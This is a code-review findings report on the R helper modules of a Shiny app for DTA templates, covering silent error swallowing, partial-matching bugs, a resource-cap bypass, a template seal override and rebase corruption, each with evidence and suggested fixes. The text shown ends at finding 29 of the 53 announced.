# Findings — slice s2-shiny-r

Slice: `inst/shiny/dta_app/R/*.R` (18 files, 20 191 lines) — the Shiny app's helper
modules: app_config, containers, dataset_template, party_profiles, template_core,
template_create, template_diff, template_history, template_index, template_inherit,
template_sources, template_ui, theme, ui_components, utils_dta, utils_export,
versioning, vocabulary.
Pinned tree: `$SNAP` = scratchpad/snapshot (68408c44). All paths relative to `$SNAP`.

Method: read-only; no R run, no server/browser started. Every finding below is
marked `verified-by-reading` or `inferred`.

Files fully read: all 18 files of the slice (see "Coverage" at the end). 53 findings: 1 blocker, 6 major, 30 minor, 16 nit (F-53 is filed in the template_sources section).

---

## app_config.R

### F-s2-shiny-r-01  [minor] [code-cheat]
- Where: inst/shiny/dta_app/R/app_config.R:616-633
- What: A `dta-app.yaml` that makes `parse_dta_app_config()` throw is discarded silently: the whole config (branding, `features.editing: false`, export limits) reverts to the stock defaults with no warning at all.
- Evidence:
  ```r
  parsed <- tryCatch(parse_dta_app_config(found$path), error = function(e) NULL)
  if (!is.null(parsed)) {
    cfg <- parsed$config
    ...
  }   # no else: nothing is reported, cfg stays dta_app_config_defaults()
  ```
  The header (lines 25-26) promises bad *content* is reported as `problems`; an I/O failure inside the parser (e.g. `readBin()` on a logo the service account cannot read, `file.size()` returning NA -> `if (NA > 1024^2)` errors) is neither a problem row nor a warning. Line 617 likewise turns any `dta_template_source_roots()` error into "no roots" silently.
- Failure scenario: a GxP deployment sets `features: {editing: false}` and a logo file that is present but unreadable (permissions). `readBin()` errors, the tryCatch returns NULL, and the app starts with editing enabled and stock branding; the log shows nothing.
- Confidence: verified-by-reading (traced `.cfg_logo` -> `readBin`/`file.size`; did not run it)
- Suggested direction: on error, keep defaults but `cli::cli_warn()` with the condition message and the config path (same channel as the problem rows at line 630).

### F-s2-shiny-r-02  [minor] [inconsistency]
- Where: inst/shiny/dta_app/R/app_config.R:337-355 (fill), 400-437 (null_ok users)
- What: An empty value (`key:` -> NULL) is reported as an error for colours, `header_tag.color` and `data_types.default`, but silently ignored (default kept) for every other key, although the stated rationale applies to all of them.
- Evidence:
  ```r
  if (is.null(v) && !nm %in% null_ok) next          # line 341: silent skip
  # null_ok: an empty `default:` arrives as null and must be reported rather
  # than silently kept as the default.                  # lines 434-435
  fill("features", ft, ...)                            # no null_ok
  ```
- Failure scenario: `features:\n  editing:   # false for this GxP library` parses `editing` as NULL; the line is skipped, editing stays TRUE, and neither the app nor `validate_template()` (which reuses this parser) reports anything. The same for `exports.default_document:` or `branding.app_title:`.
- Confidence: verified-by-reading
- Suggested direction: report NULL for every key except where NULL is a documented value (`links.*`), i.e. invert the default of `null_ok`.

## utils_dta.R

### F-s2-shiny-r-03  [blocker] [logic-error]
- Where: inst/shiny/dta_app/R/utils_dta.R:1268-1277 (dta_status_map); consumers app.R:4704, utils_dta.R:2537-2543 (report banner)
- What: A dataset is marked "pass" when no target failed and at least one passed, even if other bound tables were never validated (`status = "not_validated"`, `ok = NA`); the package's own summary calls exactly that state incomplete (R/DTA-class.R:575-584, 1165-1174 `n_unchecked`), so the app's copy of the rule has drifted.
- Evidence:
  ```r
  inv <- sum(n_invalid[idx], na.rm = TRUE)
  val <- sum(n_valid[idx], na.rm = TRUE)
  done <- sum(n_validated[idx], na.rm = TRUE)
  if (!is.na(inv) && inv > 0) "fail"
  else if (done > 0 || val > 0) "pass"   # n_targets / n_not_validated never consulted
  ```
  `results()` repeats the dataset-level `n_valid`/`n_validated` on every row and also returns `n_targets` and `n_not_validated` (R/validationReporting.R:86-91); neither is read.
- Failure scenario: dataset `dm` holds `dm_1` (checked, valid). The user loads `dm_2` into it: app.R:3514-3516 sets `dm` to "pending" and `dm_2` has no index entry. The user then checks another dataset (or an edit triggers a quiet `run_check()` elsewhere): app.R:4704 recomputes the whole map, `dm` gets inv=0, val=2, done=2 -> "pass" with `dm_2` never validated. If every dataset is "pass", `dta_build_validation_report()` prints the green "VALIDATION PASSED" banner (n_unvalidated counts datasets, not tables) over a table that was never checked. Tests (tests/testthat/test-shinyapp-dta-ops.R:17-54, test-shinyapp-file-count.R) only use single-table datasets, so nothing catches it.
- Confidence: verified-by-reading (traced validation_status() for an unindexed table -> not_validated/NA, results() counts, the app's load and check paths; not run)
- Suggested direction: classify "pass" only when `n_valid == n_targets` (no NA-verdict rows) for the dataset, otherwise "pending"/incomplete — i.e. reuse the package's n_unchecked rule; add a two-table test.

### F-s2-shiny-r-04  [minor] [dead-code]
- Where: inst/shiny/dta_app/R/utils_dta.R:277-282, 292, 301, 314, 343 (plus app.R:1250, 1869, 1924, 4782, 9756, 10499-10516, 11151)
- What: `dataset_only` is a documented compatibility leftover: every producer hard-codes FALSE, yet the flag is still threaded through the app and branched on.
- Evidence:
  ```r
  #   dataset_only    : always FALSE now (a dataset YAML is wrapped into a full
  #                     DTA); retained for back-compat with callers/old sessions.
  res$dataset_only <- FALSE
  ```
  app.R:1250 says "legacy flag ... (never set TRUE)"; the only way it can become TRUE is app.R:11151 restoring an old session file.
- Failure scenario: none functionally; the "Dataset — no metadata" pill branch (app.R:10502-10516) and the 4782 branch are unreachable for any document this version produces.
- Confidence: verified-by-reading
- Suggested direction: delete the flag and its branches (no compat is required before 1.0.0).

### F-s2-shiny-r-05  [minor] [dead-code]
- Where: inst/shiny/dta_app/R/utils_dta.R:464-469, 1351-1357/1387, 1453-1462, 1531-1532, 3326, 3799-3818, 5115-5119, 5211-5222, 5672-5674
- What: Several branches exist only to accept objects/files written by older versions; some of them swallow every error with `try(silent = TRUE)`.
- Evidence:
  ```r
  # `ds` without the provenance records of `keys` (an object that predates the
  # property is returned as it is).
  if (length(prov) > 0) try(ds@provenance <- prov[setdiff(names(prov), keys)], silent = TRUE)
  # How each bound item arrived ... an object that predates the property has nothing to carry.
  try(new_ds@provenance <- prov[intersect(names(prov), bound)], silent = TRUE)
  ```
  Others: `handler_container()` "or is an object that predates the property"; `dta_table_status_from_status_df()` "unknown" state for "a validation artifact written before the import axis existed" and the "column entirely ABSENT ... keeps the old two-axis behaviour" path; `dta_column_to_list()` `st@backend ... %||% "SAS"`; `dta_column_fields()` "A type written without a backend ("Char") is a legacy SAS one" (unreachable: `dta_column_to_list()` always pastes the backend); `dta_restore_session()` data.frame branch "from an older session file"; `dta_delivery_note()` "A plan from before the routing columns".
- Failure scenario: dead weight; the `try(silent = TRUE)` sites additionally hide a genuine validator failure (stale provenance silently kept on the dataset).
- Confidence: verified-by-reading (the "unreachable" claims for the import-axis "unknown" state rely on current index entries always carrying `n_import_errors`; R/DTADataSetFile-class.R:458 and the tabular path checked, matrix path inferred)
- Suggested direction: remove the compat branches; where a property must exist, assign without `try()`.

### F-s2-shiny-r-06  [minor] [code-cheat]
- Where: inst/shiny/dta_app/R/utils_dta.R:2657-2663, 2706-2712, 4416-4426
- What: Three lookups of package internals fall back silently when the symbol is missing, although the app ships inside the package and the symbols always exist (R/00_helpers.R:150-151, R/rulePhrasing.R:1457); a rename would degrade the app instead of failing.
- Evidence:
  ```r
  b <- tryCatch(get("__DTAtools_supported_backends__", ...), error = function(e) NULL)
  b %||% "SAS"                                        # silently drops the R backend
  types %||% c("tabular", "file", "matrix")
  fn <- tryCatch(get(".rule_summary", ...), error = function(e) NULL); if (is.null(fn)) return("")
  out <- tryCatch(fn(rule), error = function(e) "")   # a crashing phraser shows an empty description
  ```
  Neighbouring helpers (`dta_dataset_spec_key()`, `dta_backend_types()`, lines 2669-2732) call `get()` without a fallback and fail loudly — inconsistent.
- Failure scenario: `__DTAtools_supported_backends__` renamed -> the column editor offers only SAS and `dta_split_type("R numeric")` returns NA everywhere, with no error; a bug in `.rule_summary()` for one rule type shows blank rule descriptions in the editor and Inspect panel instead of an error.
- Confidence: verified-by-reading
- Suggested direction: drop the fallbacks; let a missing internal abort like the other `get()` helpers.

### F-s2-shiny-r-07  [minor] [bug]
- Where: inst/shiny/dta_app/R/utils_dta.R:4509-4513 (dta_set_rule); compare 4831-4834 (dta_set_handler), 4526 (dta_remove_rule), 1102-1104 (dta_remove_contact)
- What: Replacing a rule at an index that no longer exists appends a NEW rule instead of failing; out-of-range handling differs across the sibling editors (append / no-op / error).
- Evidence:
  ```r
  if (is.null(index) || index < 1 || index > length(rl)) {
    rl[[length(rl) + 1L]] <- rule      # an *edit* with a stale index becomes an add
  } else { rl[[index]] <- rule }
  ```
  `dta_set_handler()` stops with "File handler not found." for the same situation.
- Failure scenario: the rule editor is opened for rule 3 (`rv$rule_edit_index = 3`), the rules list shrinks (e.g. Raw YAML applied in between), Save -> a duplicate/extra rule is appended and the user is told the edit succeeded.
- Confidence: verified-by-reading (stale-index path through app.R:7384-7394 inferred, not exercised)
- Suggested direction: treat a non-NULL out-of-range index as an error, as `dta_set_handler()` does.

### F-s2-shiny-r-08  [minor] [bug]
- Where: inst/shiny/dta_app/R/utils_dta.R:4742-4746 (dta_set_handler `as_count`)
- What: File counts that are not whole numbers are silently truncated, although the error text says they "must be a whole number" and `dta_set_column()` (3936-3941) explicitly refuses non-whole lengths "never silently dropped".
- Evidence:
  ```r
  as_count <- function(x, what) {
    v <- suppressWarnings(as.integer(x))[1]     # as.integer(2.5) == 2L, as.integer("1.9") == 1L
    if (is.na(v) || v < 0) stop(sprintf("%s must be a whole number of 0 or more.", what))
  ```
- Failure scenario: a user types 2.5 as the maximum number of files -> saved as 2 with no message; 0.5 as an exact count of a pattern handler -> saved as 0.
- Confidence: verified-by-reading
- Suggested direction: require `x == trunc(x)` before converting, as `check_count()` in `dta_set_matrix()` (4223-4233) already does.

### F-s2-shiny-r-09  [minor] [security]
- Where: inst/shiny/dta_app/R/utils_dta.R:234-244 (dta_check_spec_cardinality)
- What: The DoS cap on "columns and rules" counts `columns:`, `rules:` and `files:` but not `row_labels:`, the key a matrix dataset keeps its column specs under (`dta_dataset_spec_key()`), so a matrix dataset bypasses the cap.
- Evidence:
  ```r
  for (k in c("columns", "rules", "files")) {
    if (is.list(ds[[k]]) && (k != "files" || is.null(names(ds[[k]])))) n <- n + length(ds[[k]])
  }
  ```
  The header comment (218-224) justifies the cap by per-object build/lint cost on the shared worker; a row label is a full `DTAColumnSpec`.
- Failure scenario: a YAML with one `type: matrix` dataset carrying 100 000 `row_labels:` entries (well inside the 1e6 leaf limit) passes both checks and is built and linted repeatedly on the one synchronous worker.
- Confidence: verified-by-reading (cost per row label inferred from the comment's own reasoning, not measured)
- Suggested direction: count `row_labels` as well (or count whatever `dta_dataset_spec_key()` names).

### F-s2-shiny-r-10  [minor] [code-cheat]
- Where: inst/shiny/dta_app/R/utils_dta.R:5206-5227 (dta_restore_session)
- What: A saved table that cannot be read back is dropped silently; the restored dataset just has fewer tables and the user is told nothing.
- Evidence:
  ```r
  tryCatch(
    if (is.character(df)) { ...; arrow::read_ipc_file(df, as_data_frame = FALSE, mmap = FALSE) }
    else arrow::as_arrow_table(df),
    error = function(e) NULL)
  arrow_tbls <- arrow_tbls[!vapply(arrow_tbls, is.null, logical(1))]
  ```
- Failure scenario: the Arrow IPC file of one table was removed (sweep, disk cleanup) while the `.rds` survived. "Restore previous session" reports success; app.R:11106-11119 still restores the upload records naming that table, so a slot lists a file whose table no longer exists, and nothing explains it.
- Confidence: verified-by-reading
- Suggested direction: keep the path-containment refusal, but return the names of tables that failed to load so the caller can notify.

### F-s2-shiny-r-11  [minor] [inconsistency]
- Where: inst/shiny/dta_app/R/utils_dta.R:2643-2644, 2565-2586 (dta_build_validation_report)
- What: The validation summary hard-codes "DTA" although the document name is configurable (`document.name`/`abbreviation` in dta-app.yaml) and the function already takes `document_name`.
- Evidence:
  ```r
  "<title>DTA Validation Summary</title>"
  "Files arrived outside the container the agreement requires, so this DTA fails."
  "Not every dataset was validated, so this DTA cannot be reported as passed."
  ```
- Failure scenario: a library that names its documents "Data Transmission Specification"/"DTS" gets an H1 saying "Data Transmission Specification" and a caveat saying "this DTA fails".
- Confidence: verified-by-reading
- Suggested direction: pass the abbreviation (`cfg$document$abbr`) in and use it in the title and caveats.

### F-s2-shiny-r-12  [nit] [inconsistency]
- Where: inst/shiny/dta_app/R/utils_dta.R:296-297 (dta_read_yaml); 1136-1137 (contact_display); 1044/1080 (`side_list$contacts`)
- What: The file's own RULE (lines 14-29: author YAML is read with `[[`, never `$`, because of partial matching) is broken in the function that decides a loaded document's shape, and on contact lists.
- Evidence:
  ```r
  has_metadata <- is.list(y) && !is.null(y$metadata)
  is_dta <- is.list(y) && (has_metadata || !is.null(y$datasets))
  nm <- person$name %||% "(unnamed)"; role <- person$role %||% ""
  ```
- Failure scenario: a standalone dataset YAML carrying an extra top-level key such as `metadata_notes:` is classified as a DTA document (`y$metadata` partial-matches) and handed to `read_dta_from_yaml()`, which fails instead of wrapping the dataset; a contact written with `roles: [A, B]` makes `person$role` a length-2 vector and `if (nzchar(role))` errors.
- Confidence: verified-by-reading (the contact-schema tolerance for unknown keys was not checked)
- Suggested direction: use `y[["metadata"]]`, `y[["datasets"]]`, `person[["role"]]`.

### F-s2-shiny-r-13  [nit] [inconsistency]
- Where: inst/shiny/dta_app/R/utils_dta.R:684 vs 716-728
- What: The bundled example *data* files are listed with locale-dependent `sort()`, while the example YAML list right below is deliberately radix-sorted "so an example added later lands in the same place on a German machine as it does in CI".
- Evidence: `sort(files)` (684) vs `sort(setdiff(files, known), method = "radix")` (727).
- Failure scenario: the "Load a bundled example file" dialog (app.R:3868-3882) orders names differently under de_DE and C collation (e.g. upper/lower-case and underscore ordering).
- Confidence: verified-by-reading
- Suggested direction: `sort(files, method = "radix")`.

## template_core.R, template_create.R

### F-s2-shiny-r-14  [minor] [dead-code]
- Where: inst/shiny/dta_app/R/template_core.R:44-77 (`list_dta_creation_templates()`, `get_dta_creation_template_path()`); template_core.R:1229-1272 vs template_create.R:252-292 (duplicated "legacy" dataset path)
- What: Two kinds of compatibility weight: (a) the two legacy template-lookup helpers have no caller outside tests (confirms F-t-shiny-1-27); (b) `create_dta_from_template()` keeps a second, hand-copied dataset builder for `index = NULL` purely so pre-existing callers take "exactly this code" — `build_template_datasets()` holds a "verbatim" copy of the same three branches.
- Evidence:
  ```r
  # Original path: every pre-existing caller (none of which passes
  # `index`) must keep taking exactly this code, not a reimplementation of it   (template_core.R:1230-1232)
  # Verbatim from create_dta_from_template()'s original inline branch.          (template_create.R:269)
  ```
  grep over R/, inst/shiny/dta_app (incl. app.R) and inst/qualification: `list_dta_creation_templates`/`get_dta_creation_template_path` occur only in their definitions and in app.R:2456-2459, a comment saying they "have no remaining callers in the app". The two inline branches already differ (template_create.R:284-285 expands vocabularies and slot overrides; template_core.R:1259-1264 does not — it relies on the `needs_index` probe to route such bodies away).
- Failure scenario: any fix to dataset building (token pass, tempfile cleanup, error wording) must be made twice; a template without `template:` entries/vocabularies silently takes the older copy.
- Confidence: verified-by-reading (grep for callers; both branches read)
- Suggested direction: delete the two helpers and their tests; always build through `build_template_datasets()` (it already accepts a NULL/empty index for the legacy forms).

### F-s2-shiny-r-15  [minor] [bug]
- Where: inst/shiny/dta_app/R/template_create.R:146-160 (`template_dataset_entry_kind()`), used by template_core.R:1097-1100 and template_create.R:218
- What: The entry classifier reads author YAML with `$`, so an inline dataset body that carries exactly one of the dataset provenance keys `template_source`, `template_version` or `template_date` (written by `dta_dataset_to_list()`, utils_dta.R:3427-3432, and settable one by one in the dataset editor) partial-matches `ref$template` and is misclassified as a `template:` reference.
- Evidence:
  ```r
  if (is.list(ref)) {
    if (nzchar(as.character(ref$template %||% ""))) {   # list(template_version = "1.0")$template == "1.0"
      return("template")
  ```
  utils_dta.R:14-28 states the `[[` rule and names this exact hazard class.
- Failure scenario: an author pastes an exported dataset YAML whose only provenance field is `template_version: "2.1"` into a creation template's `datasets:`; building aborts with "Could not resolve dataset template "2.1" referenced by template …" instead of building the inline dataset. With two or three `template_*` keys present the match is ambiguous and the entry happens to classify correctly, which makes the failure look random.
- Confidence: verified-by-reading (R `$` partial-matching semantics; not executed)
- Suggested direction: `ref[["template"]]`, `ref[["source"]]` (and `ref[["options"]]`, `ref[["patch"]]`, `ref[["as"]]` in build_template_datasets()).

### F-s2-shiny-r-16  [nit] [doc-wrong]
- Where: inst/shiny/dta_app/R/template_core.R:1000-1005
- What: The roxygen-style comment says the function "grew the five arguments below" and "The five new arguments each default to …", then documents six (`index`, `carry_over`, `party_selections`, `provenance`, `vocab_selections`, `study_fallback`); it also reads as change history ("every one of the 55 tests that predate them … must keep passing unmodified") rather than a description of the code.
- Evidence: `# The five new arguments each default to exactly what reproduces the ORIGINAL behaviour of this function -- every one of the 55 tests that predate them`
- Failure scenario: a reader trusting the count misses `study_fallback`, the one argument whose NULL default makes a token-using body an error.
- Confidence: verified-by-reading
- Suggested direction: describe the six arguments; drop the history.

### F-s2-shiny-r-17  [nit] [inconsistency]
- Where: inst/shiny/dta_app/R/template_core.R:976-980 (apply_template_expressions) vs 921-938 (resolve_dataset_tokens)
- What: A study token with no value is an error ("substituting "" would make … out of an unanswered question, silently"), but `${version}` with no version is silently replaced by "".
- Evidence: `env <- list("${version}" = as.character(version %||% ""))`
- Failure scenario: a template whose title is `"Transfer agreement v${version}"` and whose options leave `version` unset produces the title "Transfer agreement v" without any message.
- Confidence: verified-by-reading
- Suggested direction: treat an unset `${version}` like an unset study token (abort naming the field), or document why it is different.

### F-s2-shiny-r-18  [nit] [perf]
- Where: inst/shiny/dta_app/R/template_core.R:1261-1264; inst/shiny/dta_app/R/template_create.R:288-291
- What: Every inline dataset body is written to a `tempfile()` that is never deleted; the session sweep (utils_dta.R:5353) only removes the app's own prefixes, so these `file*.yaml` files accumulate in the worker's tempdir for every creation, every validator dry run and every template-history build.
- Evidence: `tf <- tempfile(fileext = ".yaml"); writeLines(yaml_txt, tf, useBytes = TRUE); ds <- DTAtools::read_dataset_from_yaml(tf)` — no `unlink(tf)`/`on.exit`.
- Failure scenario: a long-lived Connect worker that renders template histories (one build per version per template) keeps one small file per inline dataset per build until the process dies.
- Confidence: verified-by-reading
- Suggested direction: `on.exit(unlink(tf), add = TRUE)` — or build from the list (`DTAtools::dta_dataset_from_list()`, already used for template entries at template_create.R:249) and drop the round-trip.

## template_inherit.R, vocabulary.R

### F-s2-shiny-r-19  [major] [security]
- Where: inst/shiny/dta_app/R/template_inherit.R:796-824 (dta_template_check_sealed, route 2); vocabulary.R:882-928 (apply_vocabulary_slot_overrides); requirement inst/qualification/requirements/REQ-TMPL.yaml:377-395 (REQ-TMPL-021)
- What: A seal on a column's permitted values can be overridden by a descendant that adds a `vocabulary_slots:` entry targeting that column: route 1 compares only the definition tree (unchanged by a slot) and route 2 inspects only `options:`/`party_slots:`, but a vocabulary slot rewrites `columns.<id>.values` (and drops `values_from`) at instantiation.
- Evidence:
  ```r
  for (section in c("options", "party_slots")) {          # template_inherit.R:796
  ...
  col$values <- o$values                                  # vocabulary.R:920
  col$values_from <- NULL  # A slot's choice supersedes whatever binding the dataset template had.
  ```
  The function's own comment (757-767) gives exactly this reasoning for options ("the definition VALUE ... never moves ... the field only changes once create_dta_from_template() applies the option's effect"); REQ-TMPL-021 enumerates only options/party_slots, so the qualification requirement has the same gap.
- Failure scenario: a company standard declares an inline dataset `gf_data` and `sealed: [datasets.gf_data.columns.VISIT.values]` (the path resolves via `dta_template_path_get()`, so no `sealed_path_unknown`). A deviation template adds `vocabulary_slots: [{id: v, target: datasets.gf_data.columns.VISIT.values, vocabulary: anything@1.0, mode: open}]`. `resolve_template_inheritance()` and `validate_template()` pass; at creation the document author's picks (even free-typed terms) replace the sealed list.
- Confidence: verified-by-reading (seal routes, path resolution for an inline dataset keyed by `id`, and the slot write traced; not executed)
- Suggested direction: treat each vocabulary slot's `target` (as a `datasets.…` seal path) like an option's write path in route 2, and extend REQ-TMPL-021 accordingly.

### F-s2-shiny-r-20  [major] [bug]
- Where: inst/shiny/dta_app/R/vocabulary.R:480-484 (vocabulary_values) with 828-829 (vocabulary_slot_values)
- What: `vocabulary_values()` defaults its `terms` with the app's zero-length-is-absent `%||%`, so an explicitly empty term list silently becomes the WHOLE vocabulary; in a `mode: open` slot where the author selects only their own terms, the column receives every vocabulary term (ignoring even the slot's `include:`/`exclude:` menu) plus the custom ones.
- Evidence:
  ```r
  terms <- terms %||% vocab$terms %||% list()          # list() is "absent" for this %||% (utils_dta.R:35)
  ...
  known <- choices$terms[codes %in% selection]         # list() when every selected code is custom
  values <- vocabulary_values(choices$vocab, known, field = slot$field)
  ...
  values <- c(values, extra)
  ```
- Failure scenario: slot `{vocabulary: visit@1.0, mode: open, include: [SCR, C1D1]}`; the author clears the chips and types `UNSCHED` -> selection `"UNSCHED"`, `known = list()`, `values = c("SCR","C1D1","EOT", …all visit codes…, "UNSCHED")` instead of `"UNSCHED"`.
- Confidence: verified-by-reading (traced through `%||%` at utils_dta.R:35; not executed)
- Suggested direction: `if (is.null(terms)) terms <- vocab$terms`, and return `character(0)`/NULL for an empty term list explicitly.

### F-s2-shiny-r-21  [major] [logic-error]
- Where: inst/shiny/dta_app/R/vocabulary.R:788-811, 856-866
- What: Confirms F-t-shiny-1-14: an explicitly emptied slot ("None") returns the same NULL as an untouched slot without default, and `resolve_vocabulary_slot_overrides()` skips NULL, so the column keeps whatever the dataset template gave it (for a `values_from:` binding, the full vocabulary) — the opposite of the comment "An EXPLICITLY EMPTY selection … means no terms".
- Evidence:
  ```r
  engaged <- !is.null(selection)
  ...
  if (length(selection) == 0) { return(NULL) }           # engaged-and-empty == untouched
  values <- vocabulary_slot_values(slot, selections[[slot$id]], resolve_vocab)
  if (is.null(values)) { next }                           # no override written
  ```
  app.R:2013-2019 records the emptied control as `character(0)` precisely so that it is not treated as untouched.
- Failure scenario: as F-t-shiny-1-14 (slot default `[SCR, C1D1]`, column bound to `visit@1.0`; author clicks "None" -> built column lists every visit code). Note that "no terms" itself has no defined meaning for a column (an empty `values` is "no constraint" or "nothing allowed"?), so the fix needs a decision, not just a return value.
- Confidence: verified-by-reading
- Suggested direction: decide what an engaged empty slot writes (e.g. drop the constraint and `values_from`, or refuse with `min:`), return a distinct value for it, and test it end-to-end through `create_dta_from_template()`.

### F-s2-shiny-r-22  [minor] [bug]
- Where: inst/shiny/dta_app/R/vocabulary.R:109-128 (.coerce_vocabulary_codes)
- What: For `type: integer`, a non-integer numeric code is silently truncated instead of rejected: `as.integer("1.5")` is `1L`, not NA, so the "non-integer code" check never fires.
- Evidence:
  ```r
  out <- suppressWarnings(if (identical(type, "integer")) as.integer(txt) else as.numeric(txt))
  bad <- is.na(out) & !is.na(txt)
  ```
- Failure scenario: an integer vocabulary with codes `1`, `1.5`, `2` expands to permitted values `1, 1, 2` — 1.5 is lost and a duplicate appears, with no message (same for open-slot extras, line 841).
- Confidence: verified-by-reading (R coercion semantics; not executed)
- Suggested direction: for integer, also reject `as.numeric(txt) != trunc(as.numeric(txt))`.

### F-s2-shiny-r-23  [nit] [inconsistency]
- Where: inst/shiny/dta_app/R/vocabulary.R:162-174, 607, 617-618, 689, 703, 724-757
- What: Confirms F-t-shiny-1-18 and extends it: besides term `code/label/description`, the raw `values_from:` mapping (`x$field`, `x$include`, `x$exclude`) and every raw vocabulary-slot field except `vocabulary` (`slot$id/target/mode/field/min/label/description/include/exclude/default`) are read with `$`, although the comment at 712-718 says "only this one raw read needed `[[`".
- Evidence: `field <- as.character(x$field %||% "code")` directly after `ref <- as.character(x[["vocabulary"]] %||% "")` with its "NOT `x$vocabulary`" comment.
- Failure scenario: a slot written with `defaults: [SCR]` or `minimum: 1` is silently read as `default`/`min` (unique-prefix match), while the same kind of typo in a vocabulary's `columns:` entry is an error (line 210-216).
- Confidence: verified-by-reading
- Suggested direction: `[[` for every raw read, and reject unknown slot keys as `columns:` entries are.

### F-s2-shiny-r-24  [nit] [doc-wrong]
- Where: inst/shiny/dta_app/R/template_inherit.R:283, 526-528, 835-851
- What: Three comments contradict the code: (a) the four-state table lists `""` as "empty", but `dta_template_section_state()` tests `length(value) == 0`, so `""` is "value" (for a collection, `options: ""` then inherits every parent option and warns "Dropping 1 child entry with a missing or empty id"); (b) `dta_template_entry_key()`'s comment says datasets key on `as:`/`template:`/`source:`/`name:`, the code (`dta_template_dataset_key()`, 424) uses `id:`; (c) `dta_template_path_is_filled()` says a blank is not a fill, but `NA` (`.na`) and `NA_character_` count as filled (`nzchar(NA)` is TRUE; non-character scalars return TRUE).
- Evidence: `#   empty  -- `{}` / `[]` / `""`     -> present but blank` vs `if (length(value) == 0) return("empty")`.
- Failure scenario: an author following the table writes `options: ""` to clear inherited options and gets all of them back, plus a misleading warning.
- Confidence: verified-by-reading
- Suggested direction: fix the comments (or make `""` empty for collections), and treat NA as unfilled.

## template_diff.R

### F-s2-shiny-r-25  [major] [bug]
- Where: inst/shiny/dta_app/R/template_diff.R:900-928 (rebase_apply / apply_from_target) with 87-115 (.dta_leaf_flatten) and template_core.R:550-568 (list_set_path)
- What: Rebase writes every positional (array) metadata leaf through `list_set_path()`, which indexes by NAME; the corruption the code documents and fences off for `version_history` (772-791) hits every other array in the metadata — notably the receiver/supplier `contacts` lists.
- Evidence:
  ```r
  # 2. CORRECTNESS. These leaves are keyed positionally -- `version_history.1.version` --
  #    but list_set_path() indexes a list by NAME, so writing that key ... APPENDS a
  #    second, stub entry literally named "1"                         (772-787)
  is_vh <- function(keys) grepl("^version_history(\.|$)", keys)      # only this array is excluded
  apply_template_metadata_path(dta, paste0("metadata.", key), value) # every other take_template / "target" key
  ```
  `.dta_leaf_flatten()` keys an unnamed list by position (`supplier.contacts.1.email`); tests/testthat/test-shinyapp-template-rebase.R:642-656 pins that `list_set_path()` then appends an entry named "1".
- Failure scenario: T@1.0 has `base.metadata.supplier.contacts: [{name: Data Desk, email: dd@acme.com}]`; T@1.1 changes the email. A document built from 1.0 is rebased: `supplier.contacts.1.email` classifies `take_template`, and `rebase_apply()` turns `contacts` into `[ {Data Desk, dd@acme.com}, "1" = {email: new@acme.com} ]` — the old contact unchanged plus a nameless stub; a contact the template ADDS becomes an entry named "2" holding fields one write at a time. The same happens for a conflict resolved to "target". The rebased, partially named list is then written to YAML and exported.
- Confidence: verified-by-reading (the leaves come from `as.list(md)`, R/DTAMetaData-helpers.R:112-134, which returns `receiver`/`supplier` unchanged, so `contacts` stays an unnamed list; contacts shape also utils_dta.R:1038-1046; list_set_path behaviour from the pinned test; not executed end to end)
- Suggested direction: never write positional leaves piecewise — treat any array-valued metadata field (contacts, list-form authorized_for_corrections, …) as one collection value, as `sections` already is (136-146), or refuse such keys.

### F-s2-shiny-r-26  [minor] [design]
- Where: inst/shiny/dta_app/R/template_diff.R:748-752, 945-950
- What: After a metadata-only rebase the document's `metadata.template` claims the target version and the target definition's `content_hash`, and loses its `datasets` lineage, although its datasets were not rebased and still come from the old version.
- Evidence:
  ```r
  target_provenance <- template_provenance(
    target_loaded$value$def, target_loaded$value,
    lineage = prov$lineage %||% character(0), mixins = prov$mixins %||% character(0))   # no ds_provenance -> datasets = NULL
  S7::prop(md, "template") <- plan$target_provenance
  ```
- Failure scenario: a document built from T@1.0 with dataset template `gf@2.0` is rebased to T@1.1 (which pins `gf@3.0`); the dataset is still the 2.0 one, but provenance now says T@1.1 and no longer records `gf@2.0` (ui_components.R:789 shows `prov$datasets`); the next rebase from "1.1" reconstructs an ancestor whose datasets the document never had.
- Confidence: verified-by-reading
- Suggested direction: keep the document's own `datasets` provenance on a metadata-only rebase (or record that datasets stayed at `from_version`).

### F-s2-shiny-r-27  [minor] [dead-code]
- Where: inst/shiny/dta_app/R/template_diff.R:350-354, 367-369
- What: Confirms F-t-shiny-1-25 and F-t-shiny-1-26: a compat branch replays `prov$selections` "for documents written before the field was dropped", and a failure to resolve the recorded variant is swallowed (`error = function(e) def`), after which options are read from the unresolved family the comment two lines above says must not be used.
- Evidence: `if (!is.null(prov$selections)) { return(prov$selections) }`; `def <- tryCatch(resolve_template_variant(def, variant_sel), error = function(e) def)`.
- Failure scenario: as in the two t-shiny-1 findings; the swallowed error additionally makes the ancestor/target rebuilds use defaults for variant-only options without any message.
- Confidence: verified-by-reading
- Suggested direction: delete the compat branch; surface the variant-resolution error in the plan.

### F-s2-shiny-r-28  [nit] [doc-wrong]
- Where: inst/shiny/dta_app/R/template_diff.R:9-13, 663-666, 449-455
- What: The file header and rebase_plan's step list still say the ancestor is built "with the RECORDED selections" — selections are no longer recorded but re-derived from the document (340-351); and `materialise_template()` keeps a `carry_over` parameter "for any FUTURE caller" that no caller passes.
- Evidence: `#   ancestor   what T@1.0 would produce with the RECORDED selections`; `# 2. Materialise the ancestor at the RECORDED version/selections.`; `# and for any FUTURE caller that wants a materialised template merged with an ancestor's carried-over fields`.
- Failure scenario: a maintainer reasons about rebase accuracy assuming exact replay of the original answers, which no longer exists.
- Confidence: verified-by-reading (callers of materialise_template: template_diff.R:758 only, without carry_over)
- Suggested direction: update the comments; drop the unused parameter.

## versioning.R, template_history.R

### F-s2-shiny-r-29  [minor] [code-cheat]
- Where: inst/shiny/dta_app/R/versioning.R:434-463 (dta_version_finalise); callers app.R:1494, 9821
- What: Any failure to compute the version-history summary (unparseable baseline, a diff that throws, a failed write) is swallowed and the export goes out with the placeholder text, which then states something false in the exported agreement; the user is not told.
- Evidence:
  ```r
  # Returns `dta` UNCHANGED on every failure path ... A document left
  # with a placeholder `changes` string is bad, but a blocked export is worse.
  if (!isTRUE(parsed$ok)) { return(dta) }
  if (isTRUE(built$ok)) built$value else dta
  ```
  The placeholder is `"(changes are summarised when the document is exported)"` (275-277).
- Failure scenario: the baseline YAML no longer parses (e.g. a package change makes an old construct invalid); the user exports, and the Word/Markdown "Version History" row of the signed document reads "(changes are summarised when the document is exported)" — in the exported document itself.
- Confidence: verified-by-reading (callers read; failure trigger hypothetical)
